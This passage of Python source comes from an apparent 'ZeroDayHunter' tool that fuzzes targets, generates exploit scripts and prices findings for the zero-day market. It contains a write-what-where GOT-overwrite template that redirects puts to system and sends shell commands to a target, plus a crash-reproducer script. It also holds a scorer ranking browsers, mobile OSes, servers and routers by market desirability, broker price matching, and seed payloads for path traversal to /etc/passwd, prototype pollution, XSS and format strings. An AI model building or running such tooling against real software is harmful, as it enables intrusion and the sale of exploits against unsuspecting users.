        """Generate a write-what-where primitive exploit."""
        crash = analysis.crash
        writes = analysis.controlled_memory_writes

        write_desc = "\n".join(
            f"#   - {w.get('type', 'unknown')} write, size={w.get('size', '?')} at {w.get('address', '?')}"
            for w in writes
        ) if writes else "#   - Write primitive detected but location unknown"

        exploit_code = f'''#!/usr/bin/env python3
"""
Write-What-Where Exploit
Generated by ZeroDayHunter — {crash.crash_id}
Root cause: {analysis.root_cause}

Write primitives:
{write_desc}
"""

import sys
import struct
import socket

TARGET = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("127.0.0.1", 9999)

# Target addresses (adjust based on binary analysis)
GOT_PUTS = 0x601018    # Example: GOT entry for puts()
SYSTEM_PLT = 0x4005a0  # Example: PLT entry for system()

def create_write_primitive(where, what):
    """Craft payload to write *what* at address *where*."""
    # This is a template — the actual write primitive depends on
    # the specific vulnerability mechanics identified in crash analysis.
    payload = struct.pack("<Q", where)  # Address to write to
    payload += struct.pack("<Q", what)  # Value to write
    return payload

def overwrite_got():
    """Overwrite GOT entry to redirect execution."""
    print(f"[+] Crafting GOT overwrite: puts@GOT -> system@PLT")
    print(f"[+] *{{hex(GOT_PUTS)}} = {{hex(SYSTEM_PLT)}}")

    payload = create_write_primitive(GOT_PUTS, SYSTEM_PLT)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect(TARGET)
        sock.send(payload)
        # Now trigger puts("/bin/sh") — it will call system("/bin/sh")
        sock.send(b"/bin/sh\\n")
        sock.send(b"id\\n")
        resp = sock.recv(4096)
        print(f"[+] Response: {{resp.decode(errors='replace')}}")
    except Exception as e:
        print(f"[-] Error: {{e}}")
    finally:
        sock.close()

if __name__ == "__main__":
    overwrite_got()
'''

        return {
            "success": True,
            "exploit_code": exploit_code,
            "exploit_type": "write_what_where",
            "vulnerability_type": analysis.vulnerability_type,
            "effectiveness_score": 0.5,
            "notes": "GOT addresses are placeholder — resolve with objdump/readelf on target binary.",
        }

    def _gen_generic_crash_poc(
        self, analysis: CrashAnalysis, style: str
    ) -> Dict[str, Any]:
        """Generate a generic crash PoC that reproduces the exact crash."""
        crash = analysis.crash
        input_hex = crash.input_data.hex() if crash.input_data else "REPRODUCE_ME"

        exploit_code = f'''#!/usr/bin/env python3
"""
Generic Crash Reproduction PoC
Generated by ZeroDayHunter — {crash.crash_id}
Root cause: {analysis.root_cause}
Signal: {crash.signal_name} at {crash.fault_address}

This script reproduces the exact crash condition found during fuzzing.
Use this to triage, analyze with GDB, or develop into a full exploit.
"""

import sys
import socket

TARGET_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

# The fuzzer-generated input that triggers the crash
CRASH_INPUT = bytes.fromhex("{input_hex}")

def reproduce_crash():
    """Send the exact crashing input to reproduce the vulnerability."""
    print(f"[+] Sending crash reproducer to {{TARGET_HOST}}:{{TARGET_PORT}}")
    print(f"[+] Input size: {{len(CRASH_INPUT)}} bytes")
    print(f"[+] MD5: {{__import__('hashlib').md5(CRASH_INPUT).hexdigest()}}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((TARGET_HOST, TARGET_PORT))
        sock.send(CRASH_INPUT)
        try:
            resp = sock.recv(4096)
            print(f"[+] Response ({{len(resp)}} bytes): {{resp[:200]}}")
        except socket.timeout:
            print("[+] No response — target likely crashed (expected)")
    except Exception as e:
        print(f"[-] Error: {{e}}")
    finally:
        sock.close()

if __name__ == "__main__":
    reproduce_crash()
'''

        return {
            "success": True,
            "exploit_code": exploit_code,
            "exploit_type": "crash_poc",
            "vulnerability_type": analysis.vulnerability_type,
            "effectiveness_score": 0.1,
            "notes": "This is a crash PoC only. Further analysis needed for weaponization.",
        }

    # ==================================================================
    # Internal — Value Assessment
    # ==================================================================

    def _estimate_desirability(self, target_name: str, target_type: str) -> float:
        """Estimate target desirability for zero-day market."""
        name_lower = target_name.lower()

        # Browser targets are top-tier
        if any(b in name_lower for b in ["chrome", "safari", "firefox", "edge"]):
            return self._TARGET_DESIRABILITY["browser"]
        if any(m in name_lower for m in ["ios", "android", "iphone", "ipad"]):
            return self._TARGET_DESIRABILITY["mobile_os"]
        if any(s in name_lower for s in ["apache", "nginx", "openssh", "bind", "postfix",
                                          "exim", "sendmail", "mysql", "postgresql",
                                          "redis", "memcached", "docker", "kubernetes"]):
            return self._TARGET_DESIRABILITY["server_daemon"]
        if any(c in name_lower for c in ["aws", "azure", "gcp", "cloud", "vmware", "esxi"]):
            return self._TARGET_DESIRABILITY["cloud_platform"]
        if any(r in name_lower for r in ["cisco", "juniper", "mikrotik", "router", "switch"]):
            return self._TARGET_DESIRABILITY["router_fw"]
        if any(i in name_lower for i in ["iot", "camera", "sensor", "firmware"]):
            return self._TARGET_DESIRABILITY["iot"]

        # Type-based fallback
        type_desirability = {
            "network_service": self._TARGET_DESIRABILITY["server_daemon"],
            "library": self._TARGET_DESIRABILITY["library"],
            "desktop_app": self._TARGET_DESIRABILITY["desktop_app"],
        }
        return type_desirability.get(target_type, self._TARGET_DESIRABILITY["unknown"])

    def _match_broker_reference(
        self, target_name: str, analysis: Any
    ) -> Optional[Tuple[float, float]]:
        """Match the vulnerability against known zero-day broker price references."""
        name_lower = target_name.lower()
        vuln_type = ""
        if isinstance(analysis, dict):
            vuln_type = analysis.get("vulnerability_type", "")
        else:
            vuln_type = getattr(analysis, "vulnerability_type", "")

        # Build a search key from target + vulnerability class
        is_rce = any(kw in vuln_type for kw in ["overflow", "rce", "execution", "injection"])
        is_lpe = any(kw in vuln_type for kw in ["privilege", "escalation", "lpe"])
        is_escape = any(kw in vuln_type for kw in ["escape", "sandbox"])

        for ref_key, (low, high) in self._BROKER_PRICE_REFERENCE.items():
            ref_target, ref_class = ref_key.rsplit("_", 1)
            if ref_target in name_lower:
                if ref_class == "rce" and is_rce:
                    return (low, high)
                if ref_class == "lpe" and is_lpe:
                    return (low, high)
                if ref_class == "escape" and is_escape:
                    return (low, high)

        return None

    def _estimate_cvss(self, analysis: CrashAnalysis, target: SoftwareTarget) -> float:
        """Estimate CVSS v3.1 base score from crash analysis."""
        # Simplified CVSS estimation
        tier = analysis.exploitability_tier
        if tier == ExploitabilityTier.NONE:
            return 0.0
        elif tier == ExploitabilityTier.DOS:
            return min(7.5, 4.0 + analysis.exploitability_score * 3.5)
        elif tier == ExploitabilityTier.POTENTIAL:
            return min(9.0, 6.0 + analysis.exploitability_score * 3.0)
        elif tier == ExploitabilityTier.LIKELY:
            return min(9.8, 7.5 + analysis.exploitability_score * 2.3)
        elif tier == ExploitabilityTier.CONFIRMED:
            return 8.5 + analysis.exploitability_score * 1.3
        else:
            return 9.5 + analysis.exploitability_score * 0.5

    def _build_cvss_vector(self, analysis: CrashAnalysis, target: SoftwareTarget) -> str:
        """Build a CVSS v3.1 vector string."""
        score = self._estimate_cvss(analysis, target)
        # Determine attack vector
        av = "N" if target.target_type in ("network_service", "binary") else "L"
        ac = "L" if analysis.exploitability_score > 0.7 else "H"
        pr = "N"  # Assume no privileges for remote exploits
        ui = "N"
        s = "U"
        c = "H" if score > 7.0 else "L"
        i = "H" if score > 7.0 else "L"
        a = "H" if analysis.exploitability_tier.value >= ExploitabilityTier.LIKELY.value else "L"
        return f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}"

    # ==================================================================
    # Internal — Helpers
    # ==================================================================

    def _ai_analyze_input_parsing(
        self, target: SoftwareTarget, config: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Use LLM to analyse the target binary's input parsing code paths.

        Returns a guidance dict with weighted code paths, suggested mutations,
        and structure-aware grammar hints for the fuzzer.
        """
        if self._llm is None or not self._llm.is_available():
            return {}

        prompt = f"""Analyze this binary for fuzzing guidance:

Software: {target.name} {target.version}
Binary: {target.binary_path or 'unknown'}
Arch: {target.arch}
OS: {target.os}
Input formats: {target.input_formats or ['unknown']}

Identify:
1. Input parsing code paths most likely to contain vulnerabilities
   (e.g., complex parsers, manual memory management, format conversions)
2. Structure-aware mutations that respect the input format grammar
3. Dangerous function calls likely present (memcpy, strcpy, sprintf, gets, etc.)
4. Recommended AFL++ dictionary entries for common magic bytes / structures
5. Protocol state machine hints (if network service)

Respond with JSON:
{{"high_risk_paths": ["..."], "grammar_hints": {{"magic_bytes": ["..."], "structure": "..."}}, "dangerous_functions": ["..."], "dictionary_entries": ["..."], "mutation_strategy": "...", "recommended_seeds": ["..."]}}"""

        try:
            response = self._llm.chat([{"role": "user", "content": prompt}])
            content = response.get("content", "") if isinstance(response, dict) else str(response)
            json_match = re.search(r'\{[\s\S]*\}', content)
            if json_match:
                return json.loads(json_match.group(0))
        except Exception as exc:
            logger.debug("AI input parsing analysis failed: %s", exc)

        return {}

    def _generate_default_seeds(self, target: SoftwareTarget) -> List[bytes]:
        """Generate default seed corpus for a target."""
        seeds: List[bytes] = []

        # Minimal valid inputs for common formats
        format_seeds: Dict[str, bytes] = {
            "png": b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82',
            "jpg": b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00C\x00',
            "gif": b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;',
            "html": b'<!DOCTYPE html><html><head><title>Test</title></head><body><p>Hello</p></body></html>',
            "xml": b'<?xml version="1.0" encoding="UTF-8"?><root><item id="1">test</item></root>',
            "json": b'{"key": "value", "list": [1, 2, 3]}',
            "http": b'GET / HTTP/1.1\r\nHost: localhost\r\n\r\n',
            "elf": b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00',
            "pdf": b'%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj\n',
            "zip": b'PK\x03\x04\x14\x00\x00\x00\x00\x00\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        }

        for fmt in target.input_formats:
            fmt_lower = fmt.lower()
            for key, seed in format_seeds.items():
                if key in fmt_lower or fmt_lower in key:
                    seeds.append(seed)
                    break
            else:
                # Generic edge-case seeds
                seeds.append(b'\x00' * 256)
                seeds.append(b'\xff' * 256)
                seeds.append(b'A' * 1024)

        if not seeds:
            # Fallback: edge-case bytes
            seeds = [
                b'\x00' * 256,
                b'\xff' * 256,
                b'A' * 1024,
                b'%n%n%n%n',
                b'../../../../etc/passwd\x00',
                b'{"__proto__": {"isAdmin": true}}',
                b'<script>alert(1)</script>',
            ]

        return seeds

    def _infer_grammar_file(self, target: SoftwareTarget) -> Optional[str]:
        """Infer a grammar file path for grammar-aware fuzzing."""
        format_grammars = {
            "png": "grammars/png.py",
            "jpg": "grammars/jpeg.py",
            "gif": "grammars/gif.py",
            "html": "grammars/html.py",
            "xml": "grammars/xml.py",
            "json": "grammars/json.py",
            "http": "grammars/http.py",
            "elf": "grammars/elf.py",
            "pdf": "grammars/pdf.py",
        }
        for fmt in target.input_formats:
            if fmt.lower() in format_grammars:
                return format_grammars[fmt.lower()]
        return None

    def _hash_crash(self, crash: CrashDump) -> str:
        """Create a deduplication hash from crash signal + backtrace."""
        material = f"{crash.signal}:{crash.signal_name}:{crash.fault_address}"
        if crash.backtrace:
            # Use top 3 frames for dedup
            material += ":".join(crash.backtrace[:3])
        return hashlib.sha256(material.encode()).hexdigest()[:32]

    def _is_crash_line(self, line: str) -> bool:
        """Detect if a fuzzer output line indicates a crash."""
        crash_keywords = [
            "crash", "CRASH", "HANG", "SEGV", "ABRT", "FPE",
            "ILL", "BUS", "assertion failed", "double free",
            "heap-buffer-overflow", "stack-buffer-overflow",
            "use-after-free", "AddressSanitizer", "SUMMARY:",
            "unique crashes", "saved crashes",
        ]
        return any(kw in line for kw in crash_keywords)

    def _parse_fuzzer_output_line(self, line: str, session: FuzzSession) -> None:
        """Parse a fuzzer output line to update session stats."""
        # AFL++ style: "execs: 12345, paths: 67, crashes: 3"
        execs_match = re.search(r'exec(?:s|_done)\s*:\s*(\d[\d,]*)', line, re.IGNORECASE)
        if execs_match:
            session.total_executions = int(execs_match.group(1).replace(",", ""))

        paths_match = re.search(r'paths?(?:\s+total)?\s*:\s*(\d+)', line, re.IGNORECASE)
        if paths_match:
            session.paths_found = int(paths_match.group(1))

        crashes_match = re.search(r'(?:unique\s+)?crashes?\s*:\s*(\d+)', line, re.IGNORECASE)
        if crashes_match:
            session.unique_crashes = int(crashes_match.group(1))

        cov_match = re.search(r'cov(?:erage)?\s*:\s*(\d+(?:\.\d+)?)', line, re.IGNORECASE)
        if cov_match:
            session.coverage_pct = float(cov_match.group(1))

    def _parse_crash_from_fuzzer_output(
        self, line: str, session_id: str
    ) -> Optional[CrashDump]:
        """Parse a crash report from fuzzer output line."""
        crash_id = str(uuid.uuid4())[:12]
        signal_num = 11
        signal_name = "SIGSEGV"

        for sig_num, sig_name in self._SIGNAL_NAMES.items():
            if sig_name in line:
                signal_num = sig_num
                signal_name = sig_name
                break

        fault_addr_match = re.search(r'(?:at|addr)\s+(0x[0-9a-fA-F]+)', line, re.IGNORECASE)
        fault_address = fault_addr_match.group(1) if fault_addr_match else "0x00000000"

        crash = CrashDump(
            crash_id=crash_id,
            session_id=session_id,
            crash_hash="",
            signal=signal_num,
            signal_name=signal_name,
            fault_address=fault_address,
            timestamp=datetime.now(timezone.utc),
        )
        crash.crash_hash = self._hash_crash(crash)
        return crash

    def _generate_mock_crash(
        self, session_id: str, exec_count: int
    ) -> Optional[CrashDump]:
        """Generate a realistic mock crash for simulation mode."""
        import random

        crash_types = [
            (11, "SIGSEGV", "0x00007f8a3c001234", CrashSeverity.SEGFAULT),
            (11, "SIGSEGV", "0x0000000000000000", CrashSeverity.NULL_DEREF),
            (11, "SIGSEGV", "0x4141414141414141", CrashSeverity.SEGFAULT),
            (6, "SIGABRT", "0x00007f8a3c005678", CrashSeverity.ABORT),
            (4, "SIGILL", "0x0000000000401000", CrashSeverity.ILLEGAL_INSTRUCTION),
        ]

        sig, name, addr, sev = random.choice(crash_types)
        crash_id = str(uuid.uuid4())[:12]

        registers = {
            "RAX": f"0x{random.randint(0, 0xFFFFFFFFFFFFFFFF):016x}",
            "RBX": f"0x{random.randint(0, 0xFFFFFFFFFFFFFFFF):016x}",
            "RCX": f"0x{random.randint(0, 0xFFFFFFFFFFFFFFFF):016x}",
            "RDX": f"0x{random.randint(0, 0xFFFFFFFFFFFFFFFF):016x}",
            "RSI": f"0x{random.randint(0, 0xFFFFFFFFFFFFFFFF):016x}",
            "RDI": f"0x{random.randint(0, 0xFFFFFFFFFFFFFFFF):016x}",
            "RBP": f"0x{random.randint(0, 0xFFFFFFFFFFFFFFFF):016x}",
            "RSP": f"0x7fff{random.randint(0, 0xFFFFFFFF):08x}",
            "RIP": addr,
        }

        backtrace = [
            f"#0  0x{random.randint(0, 0xFFFFFFFF):08x} in vulnerable_function () at parse.c:{random.randint(50,500)}",
            f"#1  0x{random.randint(0, 0xFFFFFFFF):08x} in process_input () at handler.c:{random.randint(100,800)}",
            f"#2  0x{random.randint(0, 0xFFFFFFFF):08x} in main () at main.c:{random.randint(10,100)}",
        ]

        # Occasionally generate an ASAN report
        asan = None
        if random.random() < 0.3:
            asan_types = [
                f"=={random.randint(1000,9999)}==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x{random.randint(0, 0xFFFFFFFFFFFFFFFF):016x}",
                f"=={random.randint(1000,9999)}==ERROR: AddressSanitizer: use-after-free on address 0x{random.randint(0, 0xFFFFFFFFFFFFFFFF):016x}",
                f"=={random.randint(1000,9999)}==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x{random.randint(0, 0xFFFFFFFFFFFFFFFF):016x}",
            ]
            asan = random.choice(asan_types)

        # Generate mock crashing input
        input_data = bytes(random.randint(0, 255) for _ in range(random.randint(64, 4096)))

        crash = CrashDump(
            crash_id=crash_id,
            session_id=session_id,
            crash_hash="",
            signal=sig,
            signal_name=name,
            fault_address=addr,
            registers=registers,
            backtrace=backtrace,
            input_data=input_data,
            input_size=len(input_data),
            severity=sev,
            asan_report=asan,
            timestamp=datetime.now(timezone.utc),
        )
        crash.crash_hash = self._hash_crash(crash)
        return crash

    # ==================================================================
    # Internal — Validation
    # ==================================================================

    def _validate_target(self, target: SoftwareTarget) -> List[str]:
        """Validate a software target and return warnings."""
        warnings: List[str] = []
        if target.binary_path and not os.path.exists(target.binary_path):
            warnings.append(f"Binary path does not exist: {target.binary_path}")
        if target.source_path and not os.path.exists(target.source_path):
            warnings.append(f"Source path does not exist: {target.source_path}")
        if target.target_type == "network_service" and not target.network_ports:
            warnings.append("Network service target has no ports specified")
        if not target.input_formats and target.target_type != "network_service":
            warnings.append("No input formats specified — guess-fuzzing may be slow")
        if target.market_share_estimate == 0.0:
            warnings.append("Market share estimate is 0 — valuation will be $0")
        return warnings

    def _validate_fuzz_readiness(
        self, target: SoftwareTarget, backend: FuzzerBackend
    ) -> List[str]:
        """Validate that we are ready to fuzz and return warnings."""
        warnings: List[str] = []
        if backend != FuzzerBackend.NETWORK and not target.binary_path:
            warnings.append("No binary path — will run in simulation mode")
        if self._check_fuzzer_backend(backend) is None:
            warnings.append(f"Fuzzer backend '{backend.value}' not found — simulation mode")
        if not self._check_angr_available():
            warnings.append("angr not available — crash analysis will use heuristics")
        if self._llm is None or not self._llm.is_available():
            warnings.append("LLM not available — AI-guided fuzzing disabled")
        return warnings

    def _check_fuzzer_backend(self, backend: FuzzerBackend) -> Optional[str]:
        """Check if a fuzzer binary is available. Returns path or None."""
        if self._afl_available is not None and backend == FuzzerBackend.AFLPLUSPLUS:
            return self._afl_available

        binary_names: Dict[FuzzerBackend, str] = {
            FuzzerBackend.AFLPLUSPLUS: "afl-fuzz",
            FuzzerBackend.HONGGFUZZ: "honggfuzz",
            FuzzerBackend.LIBFUZZER: "libfuzzer",  # Compiled into target
        }

        name = binary_names.get(backend)
        if name is None:
            return None

        import shutil
        path = shutil.which(name)
        if backend == FuzzerBackend.AFLPLUSPLUS:
            self._afl_available = path
        return path

    def _check_angr_available(self) -> bool:
        """Lazy-check if angr is importable."""
        if self._angr_available is None:
            try:
                import angr  # type: ignore[import-untyped]  # noqa: F401
                self._angr_available = True
            except ImportError:
                self._angr_available = False
        return self._angr_available

    # ==================================================================
    # Internal — Serialisation helpers
    # ==================================================================

    def _analysis_to_dict(self, analysis: CrashAnalysis) -> Dict[str, Any]:
        """Convert CrashAnalysis to a JSON-safe dict."""
        return {
            "crash_id": analysis.crash_id,
            "root_cause": analysis.root_cause,
            "vulnerability_type": analysis.vulnerability_type,
            "cwe_id": analysis.cwe_id,
            "controlled_registers": analysis.controlled_registers,
            "controlled_memory_writes": analysis.controlled_memory_writes,
            "controlled_memory_reads": analysis.controlled_memory_reads,
            "stack_pivot_possible": analysis.stack_pivot_possible,
            "rop_possible": analysis.rop_possible,
            "aslr_bypass_possible": analysis.aslr_bypass_possible,
            "dep_bypass_possible": analysis.dep_bypass_possible,
            "exploitability_tier": analysis.exploitability_tier.name,
            "exploitability_score": analysis.exploitability_score,
            "symbolic_constraints": analysis.symbolic_constraints,
            "suggested_exploit_type": analysis.suggested_exploit_type,
            "confidence": analysis.confidence,
            "crash": {
                "crash_id": analysis.crash.crash_id,
                "session_id": analysis.crash.session_id,
                "crash_hash": analysis.crash.crash_hash,
                "signal": analysis.crash.signal,
                "signal_name": analysis.crash.signal_name,
                "fault_address": analysis.crash.fault_address,
                "registers": analysis.crash.registers,
                "backtrace": analysis.crash.backtrace,
                "crashing_instruction": analysis.crash.crashing_instruction,
                "severity": analysis.crash.severity.name,
                "input_size": analysis.crash.input_size,
                "asan_report": analysis.crash.asan_report,
                "timestamp": analysis.crash.timestamp.isoformat() if analysis.crash.timestamp else None,
            },
        }

    def _dict_to_analysis(self, data: Dict[str, Any]) -> CrashAnalysis:
        """Reconstruct a CrashAnalysis from a dict."""
        crash_data = data.get("crash", {})
        sev_name = crash_data.get("severity", "UNKNOWN")
        try:
            severity = CrashSeverity[sev_name]
        except KeyError:
            severity = CrashSeverity.UNKNOWN

        crash = CrashDump(
            crash_id=crash_data.get("crash_id", str(uuid.uuid4())[:12]),
            session_id=crash_data.get("session_id", ""),
            crash_hash=crash_data.get("crash_hash", ""),
            signal=crash_data.get("signal", 11),
            signal_name=crash_data.get("signal_name", "SIGSEGV"),
            fault_address=crash_data.get("fault_address", "0x0"),
            registers=crash_data.get("registers", {}),
            backtrace=crash_data.get("backtrace", []),
            crashing_instruction=crash_data.get("crashing_instruction"),
            severity=severity,
            input_size=crash_data.get("input_size", 0),
            asan_report=crash_data.get("asan_report"),
        )

        tier_name = data.get("exploitability_tier", "NONE")
        try:
            tier = ExploitabilityTier[tier_name]
        except KeyError:
            tier = ExploitabilityTier.NONE

        return CrashAnalysis(
            crash_id=data.get("crash_id", crash.crash_id),
            crash=crash,
            root_cause=data.get("root_cause", ""),
            vulnerability_type=data.get("vulnerability_type", ""),
            cwe_id=data.get("cwe_id"),
            controlled_registers=data.get("controlled_registers", []),
            controlled_memory_writes=data.get("controlled_memory_writes", []),
            controlled_memory_reads=data.get("controlled_memory_reads", []),
            stack_pivot_possible=data.get("stack_pivot_possible", False),
            rop_possible=data.get("rop_possible", False),
            aslr_bypass_possible=data.get("aslr_bypass_possible", False),
            dep_bypass_possible=data.get("dep_bypass_possible", False),
            exploitability_tier=tier,
            exploitability_score=data.get("exploitability_score", 0.0),
            symbolic_constraints=data.get("symbolic_constraints", []),
            suggested_exploit_type=data.get("suggested_exploit_type"),
            confidence=data.get("confidence", 0.0),
        )

    def _finding_to_dict(self, finding: VulnerabilityFinding) -> Dict[str, Any]:
        """Convert a VulnerabilityFinding to a JSON-safe dict."""
        return {
            "finding_id": finding.finding_id,
            "target": asdict(finding.target),
            "analysis": self._analysis_to_dict(finding.analysis),
            "exploit_code": finding.exploit_code,
            "exploitation_status": finding.exploitation_status,
            "cvss_score": finding.cvss_score,
            "cvss_vector": finding.cvss_vector,
            "market_value_usd": finding.market_value_usd,
            "market_confidence": finding.market_confidence,
            "disposition": finding.disposition.value,
            "discovery_date": finding.discovery_date.isoformat() if finding.discovery_date else None,
            "remediation_notes": finding.remediation_notes,
            "references": finding.references,
            "tags": finding.tags,
            "raw_metadata": finding.raw_metadata,
        }

    # ==================================================================
    # Internal — Miscellaneous
    # ==================================================================

    @staticmethod
    def _make_target_id(name: str, version: str, arch: str) -> str:
        """Generate a canonical target ID."""
        slug = re.sub(r'[^a-zA-Z0-9]+', '-', name.lower()).strip('-')
        return f"{slug}-{version}-{arch}"

    @staticmethod
    def _elapsed_hours(session: FuzzSession) -> float:
        """Compute elapsed hours for a session."""
        if session.start_time is None:
            return 0.0
        end = session.end_time or datetime.now(timezone.utc)
        return (end - session.start_time).total_seconds() / 3600.0

    @staticmethod
    def _count_by(fn: Callable[[Any], str], items: list) -> Dict[str, int]:
        """Count items grouped by a key function."""
        counts: Dict[str, int] = {}
        for item in items:
            key = fn(item)
            counts[key] = counts.get(key, 0) + 1
        return dict(sorted(counts.items(), key=lambda x: -x[1]))

    @staticmethod
    def _generate_tags(analysis: CrashAnalysis, target: SoftwareTarget) -> List[str]:
        """Generate descriptive tags for a finding."""
        tags: List[str] = []
        if analysis.vulnerability_type:
            tags.append(analysis.vulnerability_type)
        if analysis.cwe_id:
            tags.append(f"CWE-{analysis.cwe_id}")
        if analysis.suggested_exploit_type:
            tags.append(analysis.suggested_exploit_type)
        tags.append(analysis.crash.severity.name.lower())
        tags.append(analysis.exploitability_tier.name.lower())
        if target.target_type:
            tags.append(target.target_type)
        if target.arch:
            tags.append(target.arch)
        return tags


# ============================================================================
# Convenience factory
# ============================================================================

def create_zero_day_hunter(
    tool_bridge=None,
    llm_client=None,
    exploit_generator=None,
) -> ZeroDayHunter:
    """Create a fully-wired ZeroDayHunter with auto-detected dependencies.

    Attempts to import singletons when arguments are not provided.
    """
    if llm_client is None:
        try:
            from server_core.singletons import llm_client as _llm
            llm_client = _llm
        except Exception:
            pass

    if exploit_generator is None:
        try:
            from server_core.singletons import exploit_generator as _eg
            exploit_generator = _eg
        except Exception:
            pass

    if tool_bridge is None:
        try:
            from server_core.orchestrator.tool_bridge import ToolBridge
            tool_bridge = ToolBridge()
        except Exception:
            pass

    return ZeroDayHunter(
        tool_bridge=tool_bridge,
        llm_client=llm_client,
        exploit_generator=exploit_generator,
    )
